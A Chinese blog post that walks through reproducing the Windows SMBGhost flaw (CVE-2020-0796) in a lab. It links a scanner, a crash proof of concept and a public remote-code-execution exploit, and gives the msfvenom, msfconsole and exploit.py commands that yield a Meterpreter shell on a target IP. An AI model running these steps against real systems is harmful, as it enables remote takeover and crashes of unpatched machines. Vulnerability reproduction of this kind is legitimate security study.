# CVE-2020-0796 SMB远程代码执行漏洞复现 - Scivous - 博客园

> 原文：[https://www.cnblogs.com/scivous/p/14356126.html](https://www.cnblogs.com/scivous/p/14356126.html)

前言：

　　这个windows的永恒之黑漏洞，不得不复现一下啦！

　　这个漏洞诸多大佬都已经复现了，现在跟随大佬的脚步，逐个复现一下：

　　可参考：https://www.adminxe.com/1220.html

下面是漏洞复现：

　　检测poc：

　　　　使用奇安信的检测工具，检测得比较准确

　　　　http://dl.qianxin.com/skylar6/CVE-2020-0796-Scanner.zip

　　　　![](../Images/964dc13a373fc8845dbf24b944e2ce5e.png)

　　蓝屏exp：

　　　　https://github.com/insightglacier/SMBGhost_Crash_Poc/blob/master/gistfile1.py

　　该插件需要安装impactet.git

```
git clone https://github.com/SecureAuthCorp/impacket.git
 cd impacket

sudo python3 setup.py install
```

　　流程：

       　　![](../Images/f9af2b1717ee6d1fc807172f50ce451e.png)

      　　![](../Images/dc3d1f8012e3a423e2d3da1b1d8cc0b6.png)

　　远程代码执行exp：

　　　　https://github.com/chompie1337/SMBGhost_RCE_PoC

　　流程：

　　　　首先，在kali中执行：

```
msfvenom -p windows/x64/meterpreter/bind_tcp lport=7777 -f py -o exp.py
```

　　　　然后会生成一个exp.py

　　　　打开exp.py，把其中的内容全部复制，粘贴到exploit.py中的USER_PAYLOAD区域中去，注意，把buf替换成USER_PAYLOAD，保存

  　　　　![](../Images/e73812bd9b350550f1d4b0578b10e1b1.png)

　　　　在kali中打开msfconsole，进行监听：

```
use exploit/multi/handler set payload windows/x64/meterpreter/bind_tcp set lport 7777
set rhost 192.168.28.192 （目标ip）
run
```

　　　　![](../Images/24f698a3b513d2126566c8d2168ddfa4.png)

　　　　运行exploit.py脚本：

```
python3 exploit.py -ip 192.168.28.192
```

　　　　该脚本虽说是远程代码执行脚本，但有可能导致目标ip死机，蓝屏，重启等后果。也有可能目标主机不受到任何影响。

　　　　如果出现physical read primitive failed，则多次尝试执行exploit.py几次，就会成功了，这个exp是有一定概率的。

　　　　![](../Images/3bc36812b589976ac7ebf14f15a8f693.png)

　　　　在msfconsole中，看到有shell出现：

![](../Images/56549385f1b1d685d5e1ffb1bec3e1c2.png)

　　　　如果没反应，则使用Ctrl+C中断连接，再次run一次。